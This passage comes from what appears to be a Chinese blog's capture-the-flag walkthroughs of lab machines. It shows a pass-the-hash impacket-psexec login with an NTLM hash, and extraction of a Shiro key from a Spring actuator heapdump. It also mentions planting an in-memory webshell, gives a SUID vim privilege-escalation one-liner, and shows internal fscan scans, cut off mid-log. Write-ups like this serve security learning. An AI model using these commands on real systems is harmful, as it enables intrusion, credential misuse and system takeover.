title=\"FLAG3、4\"></a>FLAG3、4</h1><p>flag03在172.22.6.25的C:\\Users\\Administrator\\flag\\下</p>\n<p>flag04在172.22.6.12的C:\\Users\\Administrator\\flag\\下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# impacket-psexec  xiaorang.lab/administrator@172.22.6.12  -hashes :04d93ffd6f5f6e4490e0de23f240a5e9  -codec gbk</span><br><span class=\"line\">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Requesting shares on 172.22.6.12.....</span><br><span class=\"line\">[*] Found writable share ADMIN$</span><br><span class=\"line\">[*] Uploading file FFcjQxtS.exe</span><br><span class=\"line\">[*] Opening SVCManager on 172.22.6.12.....</span><br><span class=\"line\">[*] Creating service kiNB on 172.22.6.12.....</span><br><span class=\"line\">[*] Starting service kiNB.....</span><br><span class=\"line\">[!] Press help for extra shell commands</span><br><span class=\"line\">Microsoft Windows [版本 10.0.14393]</span><br><span class=\"line\">(c) 2016 Microsoft Corporation。保留所有权利。</span><br><span class=\"line\"></span><br><span class=\"line\">C:\\Windows\\system32&gt; type C:\\Users\\Administrator\\flag\\flag*</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# impacket-psexec  xiaorang.lab/administrator@172.22.6.25  -hashes :04d93ffd6f5f6e4490e0de23f240a5e9  -codec gbk</span><br><span class=\"line\">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Requesting shares on 172.22.6.25.....</span><br><span class=\"line\">[*] Found writable share ADMIN$</span><br><span class=\"line\">[*] Uploading file GRqsuULo.exe</span><br><span class=\"line\">[*] Opening SVCManager on 172.22.6.25.....</span><br><span class=\"line\">[*] Creating service VUIl on 172.22.6.25.....</span><br><span class=\"line\">[*] Starting service VUIl.....</span><br><span class=\"line\">[!] Press help for extra shell commands</span><br><span class=\"line\">Microsoft Windows [版本 10.0.17763.3046]</span><br><span class=\"line\">(c) 2018 Microsoft Corporation。保留所有权利。</span><br><span class=\"line\"></span><br><span class=\"line\">C:\\Windows\\system32&gt; type C:\\Users\\Administrator\\flag\\flag*</span><br></pre></td></tr></table></figure>\n\n","categories":["春秋云镜"],"tags":["靶机"]},{"title":"春秋云镜-Hospital","url":"/2025/04/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital/","content":"<h1 id=\"flag01\"><a href=\"#flag01\" class=\"headerlink\" title=\"flag01\"></a>flag01</h1><p>首先扫描一下端口，有一个22端口和8080端口，然后用fscan对这两个端口进行扫描，可以扫到一个heapdump泄露</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# ../pentest/fscan/fscan -h 39.99.232.64 -p 8080</span><br><span class=\"line\"></span><br><span class=\"line\">   ___                              _</span><br><span class=\"line\">  / _ \\     ___  ___ _ __ __ _  ___| | __</span><br><span class=\"line\"> / /_\\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class=\"line\">/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   &lt;</span><br><span class=\"line\">\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\</span><br><span class=\"line\">                     fscan version: 1.8.4</span><br><span class=\"line\">start infoscan</span><br><span class=\"line\">39.99.232.64:8080 open</span><br><span class=\"line\">[*] alive ports len is: 1</span><br><span class=\"line\">start vulscan</span><br><span class=\"line\">[*] WebTitle http://39.99.232.64:8080  code:302 len:0      title:None 跳转url: http://39.99.232.64:8080/login;jsessionid=AABFA3A139D86181B9A09BD41BE26BAD</span><br><span class=\"line\">[*] WebTitle http://39.99.232.64:8080/login;jsessionid=AABFA3A139D86181B9A09BD41BE26BAD code:200 len:2005   title:医疗管理后台</span><br><span class=\"line\">[+] PocScan http://39.99.232.64:8080 poc-yaml-spring-actuator-heapdump-file</span><br><span class=\"line\">已完成 1/1</span><br><span class=\"line\">[*] 扫描结束,耗时: 6.890674118s</span><br></pre></td></tr></table></figure>\n\n<p>访问/actuator/heapdump，奖heapdump下载下了，然后用JDumpSpider分析</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">E:\\CTF\\heapdump via ☕ v17.0.11</span><br><span class=\"line\">❯ java -jar .\\JDumpSpider-1.1-SNAPSHOT-full.jar .\\heapdump</span><br><span class=\"line\">===========================================</span><br><span class=\"line\">SpringDataSourceProperties</span><br><span class=\"line\">-------------</span><br><span class=\"line\">not found!</span><br><span class=\"line\"></span><br><span class=\"line\">===========================================</span><br><span class=\"line\">WeblogicDataSourceConnectionPoolConfig</span><br><span class=\"line\">-------------</span><br><span class=\"line\">not found!</span><br><span class=\"line\"></span><br><span class=\"line\">===========================================</span><br><span class=\"line\">MongoClient</span><br><span class=\"line\">-------------</span><br><span class=\"line\">not found!</span><br><span class=\"line\"></span><br><span class=\"line\">===========================================</span><br><span class=\"line\">AliDruidDataSourceWrapper</span><br><span class=\"line\">-------------</span><br><span class=\"line\">not found!</span><br><span class=\"line\"></span><br><span class=\"line\">===========================================</span><br><span class=\"line\">HikariDataSource</span><br><span class=\"line\">-------------</span><br><span class=\"line\">not found!</span><br><span class=\"line\"></span><br><span class=\"line\">===========================================</span><br><span class=\"line\">RedisStandaloneConfiguration</span><br><span class=\"line\">-------------</span><br><span class=\"line\">not found!</span><br><span class=\"line\"></span><br><span class=\"line\">===========================================</span><br><span class=\"line\">JedisClient</span><br><span class=\"line\">-------------</span><br><span class=\"line\">not found!</span><br><span class=\"line\"></span><br><span class=\"line\">===========================================</span><br><span class=\"line\">CookieRememberMeManager(ShiroKey)</span><br><span class=\"line\">-------------</span><br><span class=\"line\">algMode = CBC, key = GAYysgMQhG7/CzIJlVpR2g==, algName = AES</span><br><span class=\"line\"></span><br><span class=\"line\">===========================================</span><br><span class=\"line\">OriginTrackedMapPropertySource</span><br><span class=\"line\">-------------</span><br><span class=\"line\">management.endpoints.web.exposure.include = *</span><br><span class=\"line\">server.port = 8080</span><br><span class=\"line\">spring.thymeleaf.prefix = classpath:/templates/</span><br><span class=\"line\"></span><br><span class=\"line\">===========================================</span><br><span class=\"line\">MutablePropertySources</span><br><span class=\"line\">-------------</span><br><span class=\"line\">awt.toolkit = sun.awt.X11.XToolkit</span><br><span class=\"line\">sun.boot.class.path = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/resources.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/sunrsasign.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jsse.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jce.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/charsets.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jfr.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/classes</span><br><span class=\"line\">java.protocol.handler.pkgs = org.springframework.boot.loader</span><br><span class=\"line\">sun.management.compiler = HotSpot 64-Bit Tiered Compilers</span><br><span class=\"line\">sun.cpu.isalist =</span><br><span class=\"line\">sun.jnu.encoding = UTF-8</span><br><span class=\"line\">java.runtime.version = 1.8.0_392-8u392-ga-1~20.04-b08</span><br><span class=\"line\">java.class.path = /app/login-1.0-SNAPSHOT.jar</span><br><span class=\"line\">path.separator = :</span><br><span class=\"line\">java.vm.vendor = Private Build</span><br><span class=\"line\">os.version = 5.4.0-164-generic</span><br><span class=\"line\">java.endorsed.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/endorsed</span><br><span class=\"line\">java.runtime.name = OpenJDK Runtime Environment</span><br><span class=\"line\">file.encoding = UTF-8</span><br><span class=\"line\">catalina.useNaming = false</span><br><span class=\"line\">spring.beaninfo.ignore = true</span><br><span class=\"line\">java.vm.specification.version = 1.8</span><br><span class=\"line\">os.name = Linux</span><br><span class=\"line\">java.vm.name = OpenJDK 64-Bit Server VM</span><br><span class=\"line\">local.server.port = null</span><br><span class=\"line\">user.country = US</span><br><span class=\"line\">java.vendor.url.bug = http://bugreport.sun.com/bugreport/</span><br><span class=\"line\">sun.java.command = /app/login-1.0-SNAPSHOT.jar</span><br><span class=\"line\">java.io.tmpdir = /tmp</span><br><span class=\"line\">catalina.home = /tmp/tomcat.5978727065775558529.8080</span><br><span class=\"line\">java.version = 1.8.0_392</span><br><span class=\"line\">user.home = /home/app</span><br><span class=\"line\">user.language = en</span><br><span class=\"line\">PID = 750</span><br><span class=\"line\">java.awt.printerjob = sun.print.PSPrinterJob</span><br><span class=\"line\">file.separator = /</span><br><span class=\"line\">catalina.base = /tmp/tomcat.5978727065775558529.8080</span><br><span class=\"line\">java.vm.info = mixed mode</span><br><span class=\"line\">java.specification.name = Java Platform API Specification</span><br><span class=\"line\">java.vm.specification.vendor = Oracle Corporation</span><br><span class=\"line\">java.awt.graphicsenv = sun.awt.X11GraphicsEnvironment</span><br><span class=\"line\">java.awt.headless = true</span><br><span class=\"line\">sun.io.unicode.encoding = UnicodeLittle</span><br><span class=\"line\">java.ext.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext:/usr/java/packages/lib/ext</span><br><span class=\"line\"></span><br><span class=\"line\">===========================================</span><br><span class=\"line\">MapPropertySources</span><br><span class=\"line\">-------------</span><br><span class=\"line\">local.server.port = null</span><br><span class=\"line\"></span><br><span class=\"line\">===========================================</span><br><span class=\"line\">ConsulPropertySources</span><br><span class=\"line\">-------------</span><br><span class=\"line\">not found!</span><br><span class=\"line\"></span><br><span class=\"line\">===========================================</span><br><span class=\"line\">JavaProperties</span><br><span class=\"line\">-------------</span><br><span class=\"line\">java.util.logging.FileHandler.pattern = %h/java%u.log</span><br><span class=\"line\">awt.toolkit = sun.awt.X11.XToolkit</span><br><span class=\"line\">sun.cpu.isalist =</span><br><span class=\"line\">sun.jnu.encoding = UTF-8</span><br><span class=\"line\">sun.arch.data.model = 64</span><br><span class=\"line\">catalina.useNaming = false</span><br><span class=\"line\">security.overridePropertiesFile = true</span><br><span class=\"line\">sun.boot.library.path = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/amd64</span><br><span class=\"line\">security.provider.7 = com.sun.security.sasl.Provider</span><br><span class=\"line\">sun.java.command = /app/login-1.0-SNAPSHOT.jar</span><br><span class=\"line\">security.provider.9 = sun.security.smartcardio.SunPCSC</span><br><span class=\"line\">java.specification.vendor = Oracle Corporation</span><br><span class=\"line\">security.provider.1 = sun.security.provider.Sun</span><br><span class=\"line\">security.provider.2 = sun.security.rsa.SunRsaSign</span><br><span class=\"line\">security.provider.3 = sun.security.ec.SunEC</span><br><span class=\"line\">networkaddress.cache.negative.ttl = 10</span><br><span class=\"line\">security.provider.4 = com.sun.net.ssl.internal.ssl.Provider</span><br><span class=\"line\">security.provider.5 = com.sun.crypto.provider.SunJCE</span><br><span class=\"line\">security.provider.6 = sun.security.jgss.SunProvider</span><br><span class=\"line\">file.separator = /</span><br><span class=\"line\">org.springframework.web.servlet.HandlerExceptionResolver = org.springframework.web.servlet.mvc.method.annotation.ExceptionHandlerExceptionResolver,org.springframework.web.servlet.mvc.annotation.ResponseStatusExceptionResolver,org.springframework.web.servlet.mvc.support.DefaultHandlerExceptionResolver</span><br><span class=\"line\">java.specification.name = Java Platform API Specification</span><br><span class=\"line\">java.vm.specification.vendor = Oracle Corporation</span><br><span class=\"line\">org.springframework.web.servlet.HandlerMapping = org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping,org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping,org.springframework.web.servlet.function.support.RouterFunctionMapping</span><br><span class=\"line\">org.springframework.web.servlet.HandlerAdapter = org.springframework.web.servlet.mvc.HttpRequestHandlerAdapter,org.springframework.web.servlet.mvc.SimpleControllerHandlerAdapter,org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter,org.springframework.web.servlet.function.support.HandlerFunctionAdapter</span><br><span class=\"line\">org.springframework.web.servlet.FlashMapManager = org.springframework.web.servlet.support.SessionFlashMapManager</span><br><span class=\"line\">package.definition = sun.,com.sun.xml.internal.,com.sun.imageio.,com.sun.istack.internal.,com.sun.jmx.,com.sun.media.sound.,com.sun.naming.internal.,com.sun.proxy.,com.sun.corba.se.,com.sun.org.apache.bcel.internal.,com.sun.org.apache.regexp.internal.,com.sun.org.apache.xerces.internal.,com.sun.org.apache.xpath.internal.,com.sun.org.apache.xalan.internal.extensions.,com.sun.org.apache.xalan.internal.lib.,com.sun.org.apache.xalan.internal.res.,com.sun.org.apache.xalan.internal.templates.,com.sun.org.apache.xalan.internal.utils.,com.sun.org.apache.xalan.internal.xslt.,com.sun.org.apache.xalan.internal.xsltc.cmdline.,com.sun.org.apache.xalan.internal.xsltc.compiler.,com.sun.org.apache.xalan.internal.xsltc.trax.,com.sun.org.apache.xalan.internal.xsltc.util.,com.sun.org.apache.xml.internal.res.,com.sun.org.apache.xml.internal.resolver.helpers.,com.sun.org.apache.xml.internal.resolver.readers.,com.sun.org.apache.xml.internal.security.,com.sun.org.apache.xml.internal.serializer.utils.,com.sun.org.apache.xml.internal.utils.,com.sun.org.glassfish.,com.oracle.xmlns.internal.,com.oracle.webservices.internal.,oracle.jrockit.jfr.,org.jcp.xml.dsig.internal.,jdk.internal.,jdk.nashorn.internal.,jdk.nashorn.tools.,jdk.xml.internal.,com.sun.activation.registries.,jdk.jfr.events.,jdk.jfr.internal.,jdk.management.jfr.internal.</span><br><span class=\"line\">sun.boot.class.path = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/resources.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/sunrsasign.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jsse.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jce.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/charsets.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jfr.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/classes</span><br><span class=\"line\">java.protocol.handler.pkgs = org.springframework.boot.loader</span><br><span class=\"line\">sun.management.compiler = HotSpot 64-Bit Tiered Compilers</span><br><span class=\"line\">org.springframework.web.servlet.ThemeResolver = org.springframework.web.servlet.theme.FixedThemeResolver</span><br><span class=\"line\">java.runtime.version = 1.8.0_392-8u392-ga-1~20.04-b08</span><br><span class=\"line\">user.name = app</span><br><span class=\"line\">policy.url.1 = file:$&#123;java.home&#125;/lib/security/java.policy</span><br><span class=\"line\">securerandom.source = file:/dev/random</span><br><span class=\"line\">policy.url.2 = file:$&#123;user.home&#125;/.java.policy</span><br><span class=\"line\">jdk.tls.disabledAlgorithms = SSLv3, TLSv1, TLSv1.1, RC4, DES, MD5withRSA, DH keySize &lt; 1024, EC keySize &lt; 224, 3DES_EDE_CBC, anon, NULL, include jdk.disabled.namedCurves</span><br><span class=\"line\">policy.ignoreIdentityScope = false</span><br><span class=\"line\">file.encoding = UTF-8</span><br><span class=\"line\">java.util.logging.ConsoleHandler.formatter = java.util.logging.SimpleFormatter</span><br><span class=\"line\">jdk.sasl.disabledMechanisms =</span><br><span class=\"line\">java.io.tmpdir = /tmp</span><br><span class=\"line\">org.springframework.web.servlet.ViewResolver = org.springframework.web.servlet.view.InternalResourceViewResolver</span><br><span class=\"line\">java.version = 1.8.0_392</span><br><span class=\"line\">java.vm.specification.name = Java Virtual Machine Specification</span><br><span class=\"line\">jdk.tls.keyLimits = AES/GCM/NoPadding KeyUpdate 2^37</span><br><span class=\"line\">PID = 750</span><br><span class=\"line\">java.awt.printerjob = sun.print.PSPrinterJob</span><br><span class=\"line\">jdk.xml.dsig.secureValidationPolicy = disallowAlg http://www.w3.org/TR/1999/REC-xslt-19991116,disallowAlg http://www.w3.org/2001/04/xmldsig-more#rsa-md5,disallowAlg http://www.w3.org/2001/04/xmldsig-more#hmac-md5,disallowAlg http://www.w3.org/2001/04/xmldsig-more#md5,maxTransforms 5,maxReferences 30,disallowReferenceUriSchemes file http https,minKeySize RSA 1024,minKeySize DSA 1024,minKeySize EC 224,noDuplicateIds,noRetrievalMethodLoops</span><br><span class=\"line\">java.library.path = /usr/java/packages/lib/amd64:/usr/lib/x86_64-linux-gnu/jni:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu:/usr/lib/jni:/lib:/usr/lib</span><br><span class=\"line\">java.vendor = Private Build</span><br><span class=\"line\">java.specification.maintenance.version = 5</span><br><span class=\"line\">handlers = java.util.logging.ConsoleHandler</span><br><span class=\"line\">sun.io.unicode.encoding = UnicodeLittle</span><br><span class=\"line\">krb5.kdc.bad.policy = tryLast</span><br><span class=\"line\">java.class.path = /app/login-1.0-SNAPSHOT.jar</span><br><span class=\"line\">java.vm.vendor = Private Build</span><br><span class=\"line\">jdk.security.legacyAlgorithms = SHA1, RSA keySize &lt; 2048, DSA keySize &lt; 2048</span><br><span class=\"line\">jdk.disabled.namedCurves = secp112r1, secp112r2, secp128r1, secp128r2, secp160k1, secp160r1, secp160r2, secp192k1, secp192r1, secp224k1, secp224r1, secp256k1, sect113r1, sect113r2, sect131r1, sect131r2, sect163k1, sect163r1, sect163r2, sect193r1, sect193r2, sect233k1, sect233r1, sect239k1, sect283k1, sect283r1, sect409k1, sect409r1, sect571k1, sect571r1, X9.62 c2tnb191v1, X9.62 c2tnb191v2, X9.62 c2tnb191v3, X9.62 c2tnb239v1, X9.62 c2tnb239v2, X9.62 c2tnb239v3, X9.62 c2tnb359v1, X9.62 c2tnb431r1, X9.62 prime192v2, X9.62 prime192v3, X9.62 prime239v1, X9.62 prime239v2, X9.62 prime239v3, brainpoolP256r1, brainpoolP320r1, brainpoolP384r1, brainpoolP512r1</span><br><span class=\"line\">crypto.policy = unlimited</span><br><span class=\"line\">jceks.key.serialFilter = java.lang.Enum;java.security.KeyRep;java.security.KeyRep$Type;javax.crypto.spec.SecretKeySpec;!*</span><br><span class=\"line\">login.configuration.provider = sun.security.provider.ConfigFile</span><br><span class=\"line\">user.timezone =</span><br><span class=\"line\">java.vm.specification.version = 1.8</span><br><span class=\"line\">os.name = Linux</span><br><span class=\"line\">user.country = US</span><br><span class=\"line\">jdk.security.caDistrustPolicies = SYMANTEC_TLS</span><br><span class=\"line\">sun.cpu.endian = little</span><br><span class=\"line\">user.home = /home/app</span><br><span class=\"line\">user.language = en</span><br><span class=\"line\">en = UTF-8</span><br><span class=\"line\">jdk.tls.alpnCharset = ISO_8859_1</span><br><span class=\"line\">ssl.KeyManagerFactory.algorithm = SunX509</span><br><span class=\"line\">.level = INFO</span><br><span class=\"line\">java.awt.graphicsenv = sun.awt.X11GraphicsEnvironment</span><br><span class=\"line\">java.awt.headless = true</span><br><span class=\"line\">com.xyz.foo.level = SEVERE</span><br><span class=\"line\">policy.provider = sun.security.provider.PolicyFile</span><br><span class=\"line\">path.separator = :</span><br><span class=\"line\">fr = UTF-8</span><br><span class=\"line\">os.version = 5.4.0-164-generic</span><br><span class=\"line\">java.endorsed.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/endorsed</span><br><span class=\"line\">java.runtime.name = OpenJDK Runtime Environment</span><br><span class=\"line\">keystore.type.compat = true</span><br><span class=\"line\">org.springframework.web.servlet.RequestToViewNameTranslator = org.springframework.web.servlet.view.DefaultRequestToViewNameTranslator</span><br><span class=\"line\">spring.beaninfo.ignore = true</span><br><span class=\"line\">java.vm.name = OpenJDK 64-Bit Server VM</span><br><span class=\"line\">java.vendor.url.bug = http://bugreport.sun.com/bugreport/</span><br><span class=\"line\">java.util.logging.FileHandler.formatter = java.util.logging.XMLFormatter</span><br><span class=\"line\">java.util.logging.FileHandler.count = 1</span><br><span class=\"line\">catalina.home = /tmp/tomcat.5978727065775558529.8080</span><br><span class=\"line\">sun.cds.enableSharedLookupCache = false</span><br><span class=\"line\">sun.security.krb5.maxReferrals = 5</span><br><span class=\"line\">catalina.base = /tmp/tomcat.5978727065775558529.8080</span><br><span class=\"line\">java.util.logging.FileHandler.limit = 50000</span><br><span class=\"line\">java.vm.info = mixed mode</span><br><span class=\"line\">keystore.type = jks</span><br><span class=\"line\">java.ext.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext:/usr/java/packages/lib/ext</span><br><span class=\"line\">policy.expandProperties = true</span><br><span class=\"line\">securerandom.strongAlgorithms = NativePRNGBlocking:SUN</span><br><span class=\"line\"></span><br><span class=\"line\">===========================================</span><br><span class=\"line\">ProcessEnvironment</span><br><span class=\"line\">-------------</span><br><span class=\"line\">not found!</span><br><span class=\"line\"></span><br><span class=\"line\">===========================================</span><br><span class=\"line\">OSS</span><br><span class=\"line\">-------------</span><br><span class=\"line\">not found!</span><br><span class=\"line\"></span><br><span class=\"line\">===========================================</span><br><span class=\"line\">UserPassSearcher</span><br><span class=\"line\">-------------</span><br><span class=\"line\">org.apache.shiro.web.filter.authc.FormAuthenticationFilter:</span><br><span class=\"line\">[failureKeyAttribute = shiroLoginFailure, loginUrl = /login, successUrl = /, usernameParam = username, passwordParam = password]</span><br><span class=\"line\"></span><br><span class=\"line\">org.apache.catalina.startup.Tomcat:</span><br><span class=\"line\">[hostname = localhost]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">===========================================</span><br><span class=\"line\">CookieThief</span><br><span class=\"line\">-------------</span><br><span class=\"line\">not found!</span><br><span class=\"line\"></span><br><span class=\"line\">===========================================</span><br><span class=\"line\">AuthThief</span><br><span class=\"line\">-------------</span><br><span class=\"line\">not found!</span><br><span class=\"line\"></span><br><span class=\"line\">===========================================</span><br></pre></td></tr></table></figure>\n\n<p>有一个shirokey</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">algMode = CBC, key = GAYysgMQhG7/CzIJlVpR2g==, algName = AES</span><br></pre></td></tr></table></figure>\n\n<p>用shiro工具注入内存马,冰蝎连接即可</p>\n<p>vim.basic存在suid权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">app@web01:~$ find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class=\"line\">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class=\"line\"></span><br><span class=\"line\">/usr/bin/vim.basic</span><br><span class=\"line\">/usr/bin/su</span><br><span class=\"line\">/usr/bin/newgrp</span><br><span class=\"line\">/usr/bin/staprun</span><br><span class=\"line\">/usr/bin/at</span><br><span class=\"line\">/usr/bin/passwd</span><br><span class=\"line\">/usr/bin/gpasswd</span><br><span class=\"line\">/usr/bin/umount</span><br><span class=\"line\">/usr/bin/chfn</span><br><span class=\"line\">/usr/bin/stapbpf</span><br><span class=\"line\">/usr/bin/sudo</span><br><span class=\"line\">/usr/bin/chsh</span><br><span class=\"line\">/usr/bin/fusermount</span><br><span class=\"line\">/usr/bin/mount</span><br><span class=\"line\">/usr/lib/openssh/ssh-keysign</span><br><span class=\"line\">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class=\"line\">/usr/lib/eject/dmcrypt-get-device</span><br></pre></td></tr></table></figure>\n\n<p>系统存在python3环境， 参考<a href=\"https://gtfobins.github.io/gtfobins/vim/\">https://gtfobins.github.io/gtfobins/vim/</a> 提权，flag01在/root/flag下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/usr/bin/vim.basic -c &#x27;:python3 import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-pc&quot;, &quot;reset; exec sh -p&quot;)&#x27;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"flag02\"><a href=\"#flag02\" class=\"headerlink\" title=\"flag02\"></a>flag02</h1><p>然后搭建一个代理隧道，上传一个fscan开始扫描</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ip a   </span><br><span class=\"line\">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class=\"line\">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class=\"line\">    inet 127.0.0.1/8 scope host lo</span><br><span class=\"line\">       valid_lft forever preferred_lft forever</span><br><span class=\"line\">    inet6 ::1/128 scope host </span><br><span class=\"line\">       valid_lft forever preferred_lft forever</span><br><span class=\"line\">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class=\"line\">    link/ether 00:16:3e:0d:aa:83 brd ff:ff:ff:ff:ff:ff</span><br><span class=\"line\">    inet 172.30.12.5/16 brd 172.30.255.255 scope global dynamic eth0</span><br><span class=\"line\">       valid_lft 315357949sec preferred_lft 315357949sec</span><br><span class=\"line\">    inet6 fe80::216:3eff:fe0d:aa83/64 scope link </span><br><span class=\"line\">       valid_lft forever preferred_lft forever</span><br><span class=\"line\">       </span><br><span class=\"line\">       ./fscan -h 172.30.12.1/24</span><br><span class=\"line\">┌──────────────────────────────────────────────┐</span><br><span class=\"line\">│    ___                              _        │</span><br><span class=\"line\">│   / _ \\     ___  ___ _ __ __ _  ___| | __    │</span><br><span class=\"line\">│  / /_\\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class=\"line\">│ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   &lt;     │</span><br><span class=\"line\">│ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    │</span><br><span class=\"line\">└──────────────────────────────────────────────┘</span><br><span class=\"line\">      Fscan Version: 2.0.0</span><br><span class=\"line\"></span><br><span class=\"line\">[2025-04-10 17:23:09] [INFO] 暴力破解线程数: 1</span><br><span class=\"line\">[2025-04-10 17:23:09] [INFO] 开始信息扫描</span><br><span class=\"line\">[2025-04-10 17:23:09] [INFO] CIDR范围: 172.30.12.0-172.30.12.255</span><br><span class=\"line\">[2025-04-10 17:23:10] [INFO] 生成IP范围: 172.30.12.0.%!d(string=172.30.12.255) - %!s(MISSING).%!d(MISSING)</span><br><span class=\"line\">[2025-04-10 17:23:10] [INFO] 解析CIDR 172.30.12.1/24 -&gt; IP范围 172.30.12.0-172.30.12.255</span><br><span class=\"line\">[2025-04-10 17:23:10] [INFO] 最终有效主机数量: 256</span><br><span class=\"line\">[2025-04-10 17:23:10] [INFO] 开始主机扫描</span><br><span class=\"line\">[2025-04-10 17:23:10] [SUCCESS] 目标 172.30.12.5     存活 (ICMP)</span><br><span class=\"line\">[2025-04-10 17:23:10] [SUCCESS] 目标 172.30.12.6     存活 (ICMP)</span><br><span class=\"line\">[2025-04-10 17:23:10] [SUCCESS] 目标 172.30.12.236   存活 (ICMP)</span><br><span class=\"line\">[2025-04-10 17:23:13] [INFO] 存活主机数量: 3</span><br><span class=\"line\">[2025-04-10 17:23:13] [INFO] 有效端口数量: 233</span><br><span class=\"line\">[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.236:22</span><br><span class=\"line\">[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.6:445</span><br><span class=\"line\">[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.6:139</span><br><span class=\"line\">[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.6:135</span><br><span class=\"line\">[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.5:22</span><br><span class=\"line\">[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.236:8009</span><br><span class=\"line\">[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.5:8080</span><br><span class=\"line\">[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.236:8080</span><br><span class=\"line\">[2025-04-10 17:23:13] [SUCCESS] 服务识别 172.30.12.236:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.9 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9.]</span><br><span class=\"line\">[2025-04-10 17:23:13] [SUCCESS] 服务识别 172.30.12.5:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.9 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9.]</span><br><span class=\"line\">[2025-04-10 17:23:13] [SUCCESS] 端口开放 172.30.12.6:8848</span><br><span class=\"line\">[2025-04-10 17:23:18] [SUCCESS] 服务识别 172.30.12.6:445 =&gt; </span><br><span class=\"line\">[2025-04-10 17:23:18] [SUCCESS] 服务识别 172.30.12.6:139 =&gt;  Banner:[.]</span><br><span class=\"line\">[2025-04-10 17:23:18] [SUCCESS] 服务识别 172.30.12.236:8009 =&gt; </span><br><span class=\"line\">[2025-04-10 17:23:18] [SUCCESS] 服务识别 172.30.12.5:8080 =&gt; [http]</span><br><span class=\"line\">[2025-04-10 17:23:19] [SUCCESS] 服务识别 172.30.12.236:8080 =&gt; [http]</span><br><span class=\"line\">[2025-04-10 17:23:24] [SUCCESS] 服务识别 172.30.12.6:8848 =&gt; [http]</span><br><span class=\"line\">[2025-04-10 17:24:18] [SUCCESS] 服务识别 172.30.12.6:135 =&gt; </span><br><span class=\"line\">[2025-04-10 17:24:18] [INFO] 存活端口数量: 9</span><br><span class=\"line\">[2025-04-10 